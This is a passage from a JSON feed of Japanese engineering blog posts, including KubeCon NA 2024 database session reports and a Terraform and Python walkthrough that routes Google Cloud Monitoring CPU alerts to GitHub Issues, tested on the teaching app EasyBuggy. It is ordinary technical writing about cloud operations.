し、安全なデプロイを実現するための強力なプラットフォームを提供します。デモのオーバービューセッションでは、具体的なスキーママイグレーションのシナリオを例に、ダウンタイムゼロでのデータベース変更を実現する方法が紹介されていました。WarehouseテーブルのLocationカラムの衝突問題を解決するために、CityとStateカラムを追加し、Locationカラムとの同期をトリガーで実現する方法は、実務で非常に役立つアプローチです。この手法は、データベースの変更によるアプリケーションへの影響を最小限に抑え、ユーザー体験を損なうことなくシステムを進化させることを可能にします。デモで利用されるCDパイプラインデモで適用されるデータベースへの変更個人的にはこのようなユースケースのテストシナリオは複雑になることが多いと考えていたため、自動化を行うには相当のカスタマイズが必要になると思っていたので、この後のデモの手軽さには非常に驚かされました。デモのハイライトとHarnessの活用youtu.beこのセッションはデモが全体のほとんどを閉めています。デモ開始時点のリンクがブログ記事の中盤にあるので、デモ部分だけでもご覧になることを強く推奨します。セッションのデモでは、Harnessというツールが使用され、変更プロセスとロールバック手順が分かりやすく可視化されていました。Harnessは、GitLab CI/CDやGitHub ActionsのようなUIを提供し、各ステップの成功/失敗を容易に確認できる点が優れていると感じました。特に、ArgoCDとの連携によるデータベースとアプリケーションの協調動作は、複雑なデプロイプロセスを簡素化する上で非常に効果的です。デモで紹介された、望ましい状態になっていないことを確認し、変更を加えるプロセスは、実践的な知見を提供していました。また、データベースの変更セットの一部として事前にロールバック手順を定義しておくことは、本番環境での予期せぬ問題発生時に迅速な対応を可能にするベストプラクティスと言えるでしょう。LiquibaseやFlywayなどのツールはこのような機能を提供しており、データベースDevOpsの実践において不可欠です。HarnessではデータベースのDevOpsをアプリケーション、インフラストラクチャー込みで実現しており、非常に理想的なツールのように見えました。一方でこのセッションのスピーカーのひとりはHarnes.ioのエンジニアであるため、ポジショントークや見せたい部分しか見せていないことが十分考えられるので全てを鵜呑みにするのは危険です。それを差し引いても興味深いデモだったので、セッションで紹介された技術スタックを検証してみたいと思っています。まとめこのセッションは、Kubernetesとツールを活用することで、データベースの変更を安全かつ効率的に行う方法を示していました。E2Eテスト、ダウンタイムゼロのスキーママイグレーション、そしてロールバック手順の自動化は、データベースDevOpsを実現するための重要な要素です。これらの手法を適切に組み合わせることで、開発速度を向上させながら、システムの安定性と信頼性を維持することが可能になります。しかし、ここで紹介された手法は全ての状況に適用できるわけではありません。例えば、大規模なデータベースや複雑なトランザクション処理を行うシステムでは、ダウンタイムゼロのマイグレーションが困難な場合があります。そのようなケースでは、段階的なロールアウトやカナリアリリースなどの手法を検討する必要があります. また、ツールの導入や運用にはコストがかかるため、組織の規模やリソースに合わせて適切なツールを選択することが重要です。今後のデータベース運用においては、自動化と可観測性をさらに強化し、自己修復機能を備えた自律的なデータベース運用を目指していくことが重要だと考えます。Kubernetesやクラウドネイティブ技術は、この目標を実現するための基盤となるでしょう。またこのセッションを見るまで、個人的にDatabase on KubernetesはKubernetesを利用している組織でマネージドデータベースのコストを安くしたい場合や、データを自分たちのコントロールできる場所におきたい時に利用する選択肢と思っていました。しかしデータベースをKubenetesにデプロイすることでアプリケーションと密接に結合したテストを簡単に行えることがわかり、データベースの運用コストさえ許容できれば、他のメリットがなくてもデータベースをKubernetesで運用するのは十分ありなのではないかと意見が変わりました。今後は単なるデータベースのホスティング環境としてのKubernetes以外の部分にも注目していきたいです。","isoDate":"2024-12-14T18:55:02.000Z","dateMiliSeconds":1734202502000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud Deploy で Cloud Run functions に継続的デリバリーする","link":"https://zenn.dev/kimitsu/articles/cloud-deploy-cloud-run-functions","contentSnippet":"Cloud Deploy は継続的デリバリーを行うための Google Cloud のフルマネージドサービスです。標準では Google Kubernetes Engine と Cloud Run (service と job) へのデプロイをサポートしていますが、カスタムターゲットを定義することでそれ以外の対象にもデプロイすることができます。今回はカスタムターゲットを利用して Cloud Run functions へのデプロイを自動化してみます。本記事では Cloud Deploy の基本的な概念（ターゲット、リリース、デプロイパイプラインなど）については説明しません。これら...","isoDate":"2024-12-14T01:17:49.000Z","dateMiliSeconds":1734139069000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"KubeCon NA 2024: Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/13/building_resilienc_effective_backup_and_disaster_recovery_for_database_on_lubernetes","contentSnippet":"この記事は以下アドベントカレンダー13日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconawww.youtube.comKubeCon + CloudNativeCon North America 2024 のセッション \\"Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes\\" は、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の必要性を強調した示唆に富む内容でした。マーケティング的な観点や、聴衆の興味を引くためといった理由からかタイトルでベクトルデータベースとなっていますが、バックアップの部分ではあらゆるデータベースやステートフルワークロードに応用ができる内容でした。AI and Kubernetesセッションは、AI がアプリケーションにもたらす変革的な影響についての概説から始まりました。リソース需要予測による動的スケーリング、異常検知によるセキュリティ向上、UX の改善、そして事前の障害予測による可用性向上など、AI はアプリケーションのあらゆる側面を最適化する可能性を秘めています。そして、これらのメリットを実現する上で、Kubernetes が最適なプラットフォームとして位置づけられています。迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロード管理の効率化、そして効率的なバックアップとリカバリといった Kubernetes の特徴は、AI ワークロードの運用に不可欠な要素です。特に、データベースを Kubernetes 上で運用する組織が増加しているという Data on Kubernetes のレポートの言及は、AI/ML ワークロードとデータベース運用の密接な関係性を示唆しており、データベースエンジニアとして注目すべき点でした。Kubernetes がステートフルなアプリケーションの運用基盤として成熟しつつあることを改めて認識させられました。Kubernetes上でAIアプリケーションをデプロイする理由セッションでは、Kubernetes上でAIアプリケーションをデプロイする理由として、迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロードの管理の効率化、効率的なバックアップとリカバリ、そしてエコシステムとコミュニティの発展が挙げられていました。これらの利点は、クラウドネイティブな開発と運用を目指す上で非常に重要です。特に、マイクロサービスアーキテクチャを採用する際に、Kubernetes はサービスのデプロイと管理を簡素化し、スケーラビリティと可用性を向上させる上で強力なツールとなります。さらに、ベクトルデータベースのようなステートフルなサービスを Kubernetes 上で運用することで、データの永続性と可用性を確保し、AI アプリケーションの信頼性を向上させることができます。Vector Databases and RAGセッションの中核を成すのが、ベクトルデータベースと RAG (Retrieval Augmented Generation) の解説です。非構造化データの増加に伴い、従来のデータベースでは対応が難しくなってきた画像、テキスト、音声といったデータの効率的な処理が求められています。ベクトルデータベースは、これらの非構造化データをベクトル表現に変換し、類似度検索によって関連性の高い情報を高速に取得することを可能にします。Embedding Model を用いたベクトル化によって、意味的な検索が可能になり、AI アプリケーションの精度と効率性が向上する点が強調されていました。特に、生成 AI アプリケーションにおけるハルシネーション軽減とコンテキスト付与におけるベクトルデータベースの役割は重要です。RAG は、ベクトルデータベースを用いて関連情報を取得し、生成 AI の出力に信頼性を与える手法として紹介されており、今後の AI アプリケーション開発において不可欠な要素となるでしょう。ベクトルデータベースのユースケースセッションでは、ベクトルデータベースのユースケースとして、検索エンジン、画像検索、推薦アルゴリズム、異常検知、そしてチャットボットなどの生成 AI アプリケーションが挙げられていました。これらのユースケースは、現代のアプリケーション開発において非常に重要であり、ベクトルデータベースの適用範囲の広さを示しています。特に、マイクロサービスアーキテクチャにおいて、ベクトルデータベースを独立したサービスとして提供することで、様々なサービスから容易にアクセスできるようになり、システム全体の柔軟性と拡張性を向上させることができます。また、DevOps/SRE の実践においては、ベクトルデータベースの監視と運用を自動化することで、システムの信頼性と可用性を向上させることができます。Data Protectionデータ保護は、Kubernetes 上で運用されるベクトルデータベースにとって不可欠な要素です。データの整合性とセキュリティ、災害復旧、コストと時間の効率化、バージョンコントロール、そしてコンプライアンス規制への準拠など、データ保護は多岐にわたるメリットを提供します。セッションでは、Kubernetes 上でのベクトルデータベースのデータ保護方法として、ストレージスナップショット、データサービスを利用したストレージスナップショット、データサービスレベルのスナップショット、そしてこれらの組み合わせが紹介されました。PVC を利用した永続化データの保護は、Kubernetes ネイティブなデータ保護戦略を構築する上で重要なポイントです。Kanister のようなデータ保護ワークフロー管理ツールは、バックアップとリストアの手順を抽象化し、自動化することで、運用効率を大幅に向上させることができます。Kanister の Blueprint、Profile、ActionSet といった CRD を活用することで、柔軟なデータ保護ワークフローを定義し、Kubernetes の宣言的な運用を実現できます。Kanisterの動作Kanister の動作は、ActionSet が Controller に動作を開始するようにトリガーし、Controller が Blueprint を参照して定義されたオペレーションに従ってベクトルデータベースからバックアップを取得し、オブジェクトストレージに保存するという流れで実行されます。動作完了後、Controller は ActionSet に完了を伝え、ActionSet がユーザーに完了を通知します。この自動化されたワークフローは、データベースエンジニアの運用負荷を軽減し、ヒューマンエラーのリスクを最小限に抑える上で非常に有効です。また、バックアップとリストアのプロセスをコード化することで、再現性と信頼性を向上させることができます。Demoデモでは、書籍推薦チャットボット BookNest を例に、PostgreSQL と PGVector を利用したベクトルデータベースのバックアップとリストアのワークフローが紹介されました。提供された図とデモ動画は、Kanister を用いたデータ保護の実践的な方法を理解する上で非常に役立ちました。具体的な構成例を示すことで、視聴者は自身の環境に合わせたデータ保護戦略を検討する際の参考にすることができます。また、デモを通じて Kanister の操作方法やワークフローの定義方法を視覚的に理解することができ、実践的な知識を深めることができます。Kanister の Blueprint は Kubernetes の manifest 内で ShellScript を書くようなイメージでかけるため、すでに Kubernetesを利用している組織であれば利用に大きなハードルは少なそうだと感じました。Operator 化されたデータベースでは大きなメリットはないかもしれないですが、そうでないデータベースのバックアップや、Operator を使っていても複数の種類がある場合オペレーションの使用ツールの共通化という面で十分メリットがあるでしょう。Call to Actionセッションの締めくくりとして、AI アプリケーションとベクトルデータベースの重要性、そしてデータ保護の必要性が改めて強調されました。データ保護を Day 0 Operation と位置づけるというメッセージは、システム設計の初期段階からデータ保護を考慮することの重要性を示唆しています。システムの保守性、スケーラビリティ、セキュリティを確保する上で、データ保護は不可欠な要素であり、アプリケーション開発ライフサイクル全体を通じて考慮する必要があります。まとめこのセッションは、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の構築方法について、具体的な例を交えながら分かりやすく解説していました。特に、Kanister のようなデータ保護ツールを活用することで、複雑なバックアップとリカバリのワークフローを簡素化し、自動化できる点が印象的でした。データベースを Kubernetes 上で運用する際には、データ保護を Day 0 Operation として捉え、Kanister のようなツールを活用することで、システムの信頼性と可用性を向上させることができます. セッションで提示された情報は、今後のデータベース運用戦略を検討する上で非常に貴重な示唆を与えてくれました。このセッションで扱われなかった点として、ベクトルデータベースの選択基準やパフォーマンスチューニング、そして異なるベクトルデータベースにおけるデータ保護戦略の差異などが挙げられます。今後のセッションでは、これらの点についても掘り下げて議論されることを期待します。","isoDate":"2024-12-13T08:57:05.000Z","dateMiliSeconds":1734080225000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ｻｯとかざして即起動! 推しグッズを神曲再生アイテムに(*\xb0∀\xb0)","link":"https://zenn.dev/nedoko_dok0dko/articles/9db9d10902ec03","contentSnippet":"※3-shake Advent Calendar 2024の13日目のエントリー記事です。本日、12月13日は金曜日。世の中では「ジェイソンの日」なんて言われています。とはいえ、生まれてこの方ジェイソンの映画を見ることがなかったためこの手の話についてはかなり縁遠い気がしていします。(JSONの方先に連想しちゃいますし)むしろ「華金だーー＼(^o^)／」くらいしか考えていません。それしかありません。そんな社会人です。さて、今年もやってまいりましたアドベントカレンダー。2024年も引き続き参加させていただく運びとなりました。テーマは前回同様「技術・非技術関係なし!自由!」ということ...","isoDate":"2024-12-12T15:00:01.000Z","dateMiliSeconds":1734015601000,"authorName":"seno","authorId":"seno"},{"title":"GolangからPagerdutyのインシデントを発砲する","link":"https://zenn.dev/tayusa/articles/9091399d6a9018","contentSnippet":"目的Golangで作成したアプリケーションからPagerdutyの任意のインシデントを発砲する Event API v2https://developer.pagerduty.com/docs/3d063fd4814a6-events-api-v2-overview高信頼性、高可用性の非同期APIでシステムからマシンイベントを取り込みます。このAPIに送られたイベントは最終的にPagerDutyサービスにルーティングされ処理されます Event Types Alert監視システムの問題。 既存のアラートを確認または解決するためにイベントを送信することができる...","isoDate":"2024-12-11T13:30:34.000Z","dateMiliSeconds":1733923834000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Google Cloud monitoringのアラートをGitHub Issueに通知する","link":"https://kechigon.hatenablog.com/entry/2024/12/11/182649","contentSnippet":"タイトルの通り、Google Cloud monitoringのアラートをGitHub Issueに通知するシステムの構築方法を紹介します。terrafromを使って作成します。コードはGitHubリポジトリにまとまっています。github.comこのコードをapplyすることで、Webサービス(EasyBuggy)、監視、アラートをIssueに持っていくパイプラインがデプロイされます。システム図このような構成をとっています。main.tf早速コードを紹介していきます。このファイルでは、EasyBuggyという脆弱なWebサービスをGCEにデプロイします。terraform {  required_providers {    google = {        source = \\"hashicorp/google\\"        version = \\"5.39.0\\"    }  }}provider \\"google\\" {  credentials = var.credential_file  project     = var.project  region      = var.region}resource \\"google_compute_instance\\" \\"easybuggy\\" {  name         = \\"easybuggy-instance\\"  machine_type = \\"n1-standard-1\\"  zone         = var.zone  boot_disk {    initialize_params {      image = \\"debian-cloud/debian-11\\"    }  }  network_interface {    network = \\"default\\"        access_config {}  }  metadata = {    \\"enable-osconfig\\" = \\"true\\"  }     metadata_startup_script = <<EOF#!/bin/bashsudo apt-get updatefor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; donesudo apt-get install -y ca-certificates curl git sudo install -m 0755 -d /etc/apt/keyringssudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.ascsudo chmod a+r /etc/apt/keyrings/docker.ascecho \\\\  \\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\\\  $(. /etc/os-release && echo \\"$VERSION_CODENAME\\") stable\\" | \\\\sudo tee /etc/apt/sources.list.d/docker.list > /dev/nullsudo apt-get updatesudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-pluginsudo git clone https://github.com/k-tamura/easybuggy.gitcd easybuggysudo docker build . -t easybuggy:local sudo docker run -p 8080:8080 easybuggy:local EOF}resource \\"google_compute_firewall\\" \\"allow-home-ip\\" {  name    = \\"allow-home-ip\\"  network = \\"default\\"   allow {    protocol = \\"tcp\\"    ports    = [\\"8080\\"]  }  source_ranges = [var.my_ip]}output \\"instance_ip\\" {  value = google_compute_instance.easybuggy.network_interface[0].access_config[0].nat_ip}monitoring.tfこちらのファイルでは監視、アラートをIssueに持っていくパイプラインをデプロイします。main.tfでデプロイしたインスタンスのCPU使用率が80%を超えるとアラートが発生します。resource \\"google_pubsub_topic\\" \\"alerts_topic\\" {  name = \\"alerts-topic\\"}resource \\"google_pubsub_subscription\\" \\"alerts_subscription\\" {  name  = \\"alerts-subscription\\"  topic = google_pubsub_topic.alerts_topic.name}resource \\"google_monitoring_notification_channel\\" \\"pubsub_channel\\" {  display_name = \\"Pub/Sub to Cloud Function\\"  type         = \\"pubsub\\"  labels = {    \\"topic\\" = google_pubsub_topic.alerts_topic.id  }}resource \\"google_pubsub_topic_iam_binding\\" \\"alerts_topic_publisher\\" {  topic = google_pubsub_topic.alerts_topic.name  role    = \\"roles/pubsub.publisher\\"  members = [    \\"serviceAccount:service-${var.project_id}@gcp-sa-monitoring-notification.iam.gserviceaccount.com\\"  ]}resource \\"google_storage_bucket\\" \\"easybuggy_monitoring_function_bucket\\" {  name          = \\"easybubby_monitoring-functions-bucket\\"  location      = \\"ASIA-NORTHEAST1\\"  force_destroy = true}resource \\"google_storage_bucket_object\\" \\"function_source_object\\" {  name   = \\"function-source.zip\\"  bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source = \\"function-source.zip\\"}resource \\"google_cloudfunctions_function\\" \\"issue_creator_function\\" {  name        = \\"issue-creator-function\\"  description = \\"Receive Pub/Sub message from Google Cloud Monitoring and create a GitHub issue\\"  runtime    = \\"python39\\"  source_archive_bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source_archive_object = google_storage_bucket_object.function_source_object.name  entry_point           = \\"main\\"  region                = var.region  environment_variables = {    \\"GITHUB_API_TOKEN\\" = var.github_api_token    \\"GITHUB_REPO\\"      = var.github_repo    \\"GITHUB_OWNER\\"     = var.github_owner  }  event_trigger {    event_type = \\"providers/cloud.pubsub/eventTypes/topic.publish\\"    resource   = google_pubsub_topic.alerts_topic.id  }}resource \\"google_monitoring_alert_policy\\" \\"cpu_usage_policy\\" {  display_name = \\"High CPU Utilization Alert\\"  combiner     = \\"OR\\"  conditions {    display_name  = \\"CPU usage over 80%\\"    condition_threshold {      filter          = \\"metric.type=\\\\\\"compute.googleapis.com/instance/cpu/utilization\\\\\\" AND resource.type=\\\\\\"gce_instance\\\\\\"\\"      duration        = \\"60s\\"      comparison      = \\"COMPARISON_GT\\"      threshold_value = 0.8      }  }  enabled = true  notification_channels = [google_monitoring_notification_channel.pubsub_channel.id]}main.pyfunctionsで実行されるコードです。pub/subから受け取ったデータからアラートのtitleとbodyを抜き出してGithub Issueにポストします。import base64import jsonimport osimport loggingimport requestsfrom flask import Flask, requestapp = Flask(__name__)GITHUB_API_TOKEN = os.environ.get(\'GITHUB_API_TOKEN\')GITHUB_REPO = os.environ.get(\'GITHUB_REPO\')GITHUB_OWNER = os.environ.get(\'GITHUB_OWNER\')logging.basicConfig(level=logging.INFO)logger = logging.getLogger(__name__)def create_github_issue(data):    issue_title = f\\"Alert: {data[\'incident\'][\'incident_id\']}\\"    issue_body = data[\'incident\'][\'summary\']    logger.info(f\\"Creating issue with title: {issue_title} body: {issue_body}\\")    response = requests.post(        f\\"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/issues\\",        headers={            \\"Authorization\\": f\\"token {GITHUB_API_TOKEN}\\",            \\"Accept\\": \\"application/vnd.github.v3+json\\",        },        json={            \\"title\\": issue_title,            \\"body\\": issue_body,        },    )    if response.status_code == 201:        logger.info(\\"Issue created successfully\\")        return \\"Issue created successfully\\", 201    else:        logger.error(f\\"Failed to create issue: {response.content}\\")        return f\\"Failed to create issue: {response.content}\\", response.status_code@app.route(\'/\', methods=[\'POST\'])def main(d, context): #Need to receive arguments    envelope = request.get_json()        if not envelope:        logger.error(\\"No envelope received\\")        return \\"Bad Request\\", 400        logger.info(f\\"envelope: {envelope}\\")    pubsub_data = envelope.get(\'data\', {})    logger.info(f\\"pub_sub_data\\")    if not pubsub_data:        logger.error(f\\"No outside data received: \\")        return \\"Bad Request\\", 400    try:        data_base64 = pubsub_data.get(\'data\', \'\')        if not data_base64:            raise ValueError(\\"No data field in outside data\\")                data = base64.b64decode(data_base64.encode(\'utf-8\')).decode(\'utf-8\')        logger.info(f\\"Decoded data: {data}\\")        data = json.loads(data)                logger.info(f\\"Received data: {data}\\")    except Exception as e:        logger.error(f\\"Error processing message: {e}\\")        return \\"Bad Request\\", 400        return create_github_issue(data)if __name__ == \\"__main__\\":    app.run()デプロイ内容を理解したらterraform applyしましょう。アプライが成功したらインスタンスIPが表示されます。動作確認http://instance_ip:8080にブラウザでアクセスするとこのような画面になります。「無限ループ」のリンクを押し、無限ループを発生させましょう。CPU使用率が80%を超えたことを確認し、GitHub Issueを確認すると、アラートが通知されています。以上がGoogle Cloud monitoringのアラートをGitHub Issueに通知する流れとなります。","isoDate":"2024-12-11T09:26:49.000Z","dateMiliSeconds":1733909209000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"Kube-schedulerプラグインCoschedulingを体験してみた","link":"https://zenn.dev/k_nagase/articles/co_scheduling","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 11 日目の記事です。 はじめにここ最近Kubernetesのスケジューリングについて調査する機会があり、その一環でスケジューラープラグインの1つであるCoschedulingについても調査しました。この時の調査と簡単なハンズオンについてこの記事でまとめてみたいと思います。Kubernetesのコントロールプレーンの1コンポーネントであるスケジューラはpluginによる機能拡張が可能です。プラグインは以下のリポジトリにまとまっています。https://github.com/kubernetes...","isoDate":"2024-12-11T01:00:01.000Z","dateMiliSeconds":1733878801000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"スリーシェイクインタビュー: 技術顧問 うたもくさん編","link":"https://sreake.com/blog/interview-utam0k/","contentSnippet":"こんにちは。スリーシェイクのSreake事業部所属の早川(@bells17)です。 今回は7月からスリーシェイクの技術顧問に就任してもらったうたもくさん(@utam0k)に対談形式でインタビューをさせていただきましたので […]The post スリーシェイクインタビュー: 技術顧問 うたもくさん編 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-10T04:16:19.000Z","dateMiliSeconds":1733804179000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLで値を変換したい？それならcaseはいかが?","link":"https://zenn.dev/nedoko_dok0dko/articles/c677f78d5ae2b0","contentSnippet":"はじめに※本投稿はLooker Advent Calendar 2024 の10日目の記事となりますはじめまして。偶然業務でLookerに出会い、そこから色々触っているデータエンジニアです。Lookerについてはまだまだ駆け出しの身ではありますが、少しずつ分かる事が増え、Lookerへの理解が深まってきたと感じています。今回はそんな初心者がLookerのフィールドパラメータであるcaseを触ってみた話です。 想定読者Lookerについて基本概要を知っているLookMLを知っているLookMLを触ったことがある・実装したことがある 背景・経緯※情報に関して...","isoDate":"2024-12-09T16:42:38.000Z","dateMiliSeconds":1733762558000,"authorName":"seno","authorId":"seno"},{"title":"「Cloud Run functions」にコンテナがデプロイできるの知ってる？","link":"https://zenn.dev/kimitsu/articles/deploy-container-to-cloud-run-functions","contentSnippet":"!本記事はネタ記事です！Cloud Run functions は Google Cloud の FaaS です。ユーザはコンテナ、ランタイム、Web サーバーを管理することなく、コードを書くだけでデプロイすることができます。本来はコンテナ化が不要な Cloud Run functions ですが、コンテナをデプロイできることをご存知でしょうか。 Cloud Run functions の仕組みユーザが Cloud Run functions にデプロイしたコードは複数の抽象化レイヤーの上で動きます。[1]一番内側にユーザが書いたコードがあり、その下にはまず Func...","isoDate":"2024-12-08T13:16:22.000Z","dateMiliSeconds":1733663782000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【GitHub Actions】編集されたディレクトリに応じてラベルを付与する","link":"https://zenn.dev/kamos/articles/16def632754577","contentSnippet":"はじめに最近になってTerraformを触る機会が少し増えてきました。そのリポジトリはdevelopment, staging, productionのそれぞれのディレクトリがありました。.└── environments    ├── development    │   ├── main.tf    │   └── xxx.tf    ├── staging    │   ├── main.tf    │   └── xxx.tf    └── production        ├── main.tf        └── xxx.tfこの構成では環境...","isoDate":"2024-12-08T13:14:28.000Z","dateMiliSeconds":1733663668000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":" KubeCon NA 2024: The Future of DBaaS on Kubernetesのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/08/kubecon_na_the_future_of_dbaas_ob_kubernetes","contentSnippet":"この記事は以下アドベントカレンダー8日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2The Future of DBaaS on Kubernetesのセッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kL/the-future-of-dbaas-on-kubernetes-melissa-logan-constantia-sergey-pronin-percona-deepthi-sigireddi-planetscale-gabriele-bartolini-edbセッション動画:https://www.youtube.com/watch?v=Z35SlsYd1ds「The Future of DBaaS on Kubernetes」は、Data on Kubernetes Communityのメンバーによるパネルディスカッション形式で、Kubernetes上で動作するDBaaSの将来について議論されました。ここ数年でデータベースをKubernetes上で動かすにあたりどう便利になったか？セッションでは、Kubernetesにおけるストレージとネットワーキングの進化が、データベース運用を大きく改善した点が強調されました。Volume Snapshotなどのストレージ関連機能の向上は、バックアップとリカバリといったDay 2 Operationを効率化し、Local Persistent Volumeの導入と改善は、データベースの高可用性とディザスタリカバリ構成をシンプルに実現可能にしました。また、Cilium Network PolicyやIngress/Egressといったネットワーキング機能は、マルチテナントサービスにおけるアクセス制御を容易にし、セキュリティ強化に貢献しています。これらの改善により、増加するデータベースと、優秀なデータベースエンジニア不足という課題に対し、Kubernetesは少ない人員でデータベースをスケールさせる有効な手段となっています。数年前に比べ、Kubernetes上でのデータベース運用はより現実的になり、エンタープライズグレードの運用にも耐えうるレベルに達しています。これは、Kubernetesがステートレスなアプリケーションだけでなく、ステートフルなデータベースにも適したプラットフォームへと進化したことを示しています。私がKubernetesを触り始めた時点ではここで紹介されているほとんどの機能はサポートされており、なぜKubernetesでデータベースを運用することが難しいのかを理解しきれない面がありました。このセクションによる直近のデータベース観点でのKubernetesのアップデートの紹介により、何が障壁でそれがどのように解決されたのかの理解が深まりました。Kubernetes上でデータベースを動かしている顧客についてシェアできる事例はあるか？セッションでは、Nokia、Broadcom、HubSpot、Shopify、IBMなど、様々な企業がKubernetes上でデータベースを運用している事例が紹介されました。これらの事例は、マイクロサービスアーキテクチャの普及と密接に関連しています。マイクロサービス化されたアプリケーションでは、単一のモノリシックなデータベースではなく、サービスごとにデータベースを持つ傾向があり、Kubernetesはそのような分散データベース環境の構築と管理を容易にします。特に、開発者がデータベースを所有し、インフラ管理者がDBaaSをインターフェイスとしてデータベースを払い出すという新しい運用モデルは、今後の主流となる可能性を示唆しています。これは、DevOpsの原則をデータベース運用に取り入れることで、開発速度と運用効率を向上させるアプローチと言えるでしょう。セクション内で紹介されている開発者がデータベースを所有し、インフラ管理者がデータベースを払い出すという体制はパブリッククラウドで運用されるマイクロサービスアーキテクチャでは当たり前のように実践されており、Kubernetesでも今後の主流となると考えることは不思議ではないでしょう。そしてそれは従来のVMやベアメタルベースのDBAがデータベース管理を行うには多すぎるデータベースが運用され、限界を迎えることは想像に難くなく、KubernetesとOperatorによる運用の簡略化は必須と言えるかもしれません。Kubernetes上でデータベースを動かすにあたりベストプラクティスはなにか？ベストプラクティスとして、クラウド中立性、クラウドレディネス、セルフサービス、セキュリティ、アーキテクチャ設計などが挙げられました。Operatorの活用は、クラウドベンダーに依存しない運用を実現する上で重要であり、UI/APIの整備やArgoCDなどのツールとの連携により、データベースのプロビジョニングと管理を自動化できます。また、開発者が容易にスケーリングやテスト環境構築を行えるセルフサービス環境も重要です。セキュリティについては、業界標準やコンプライアンス要件に合わせたポリシー設定が不可欠です。アーキテクチャ設計では、PostgreSQLを例に、Kubernetesの機能を活用した高可用性構成や、複数のアベイラビリティゾーンを考慮した設計が重要となります。さらに、Kubernetesの標準APIを活用することで、オブザーバビリティやセキュリティ、証明書の管理を簡素化し、他のコンポーネントとの統合を容易にすることが推奨されています。VMからの移行時には、ストレージを分離することでリソース管理の予測精度を高めることが重要です。ここではベストプラクティスとしてユーザーがセルフサービスでデータベースを立ち上げる方法としてGUIとAPIとツール連携による自動化二つの観点が出ていました。個人的にはパブリッククラウドとIaCの流れを見るにGUIベースよりAPIによる自動化が主流になっていくのではないかと考えます。またデータベースではないですがオンプレミスのVMベースシステムからKubernetesのコンテナベースに移行するプロジェクトに関わった時は独自のプロトコルによる通信をVMで実装しており、その方法をコンテナの世界に持ち込もうとした結果非常に複雑になっていた事例を見たことがあります。そのため、ここで紹介されているKubernetesとそのエコシステムに合わせることは不可欠ではないかと感じます。データベースをKubenetesで動かす場合の課題や落とし穴はあるか？セッションでは、VM環境での運用とKubernetes環境での運用を混同してしまうこと、マイグレーション計画の不足、リソースの過剰確保、そして人材育成の課題が議論されました。既存のVM向けスクリプトをそのままKubernetesに適用しようとするのではなく、クラウドネイティブな考え方を取り入れ、スケーラビリティと信頼性の向上に焦点を当てるべきです。マイグレーションにおいては、全てのワークロードの移行と、ダウンタイム最小化を両立するための綿密な計画が必要です。リソース管理においては、Kubernetesの柔軟性を活かし、適切なリソース割り当てを行うための実験と調整が重要です。さらに、DBAがKubernetesの基礎知識を習得し、データベース運用における新たなパラダイムシフトに対応できるよう、人材育成に力を入れる必要があります。このセッションを通して一番に感じたのはオンプレからパブリッククラウドへの移行と気にするところは同じだということと、DBAとKubernetesの距離を近づけることはやはり大事だということでした。特にDBAとKubernetesについてはより簡単なソリューションとして存在してしまっているマネージドデータベースが、Kubernetesを利用することから目を背けさせてしまう要因になっていると感じます。しかしDBAがより求められるのはデータベースをセルフホストする場合で、今後DBAとして活躍していくにはLinuxに適応してきたようにKubernetesに適応していく日強うがあると考えています。DBaaSの将来はどのように変わっていくと考えるか？将来のDBaaSは、Kubernetesとの統合がさらに深まり、データベースとKubernetesの境界が曖昧になっていくと予測されています。PostgreSQLの例では、Kubernetesとの親和性を高めるためのパッチ適用や、拡張機能のコンテナ化などが進んでいます。また、プライベートDBaaSだけでなく、商用DBaaSのKubernetes上での提供も増加し、データベースサービスの利用がさらに容易になると考えられます。Google Cloudなどのクラウドプロバイダーも、将来的にKubernetes上でマネージドデータベースサービスを提供する可能性があり、これにより、数千規模のデータベース管理が容易になるでしょう。Kubernetesの普及と成熟に伴い、Helm ChartやYAML以外の、より洗練されたUXも期待されます。セッション内ではGoogle CloudではCloud SQLがKubenetes1で運用される未来があるかもしれないと言及していましたが、すでにSpannerはKubernetesで動いています。商用DBaaSがKubernetesで動くことについてはよくある構成ですが、プライベートDBaaSがKubernetes上で動き、さまざまなエコシステムと組み合わせてAPIベースなど自動化に適したUXが提供されていくことには非常に注目しています。まとめ「The Future of DBaaS on 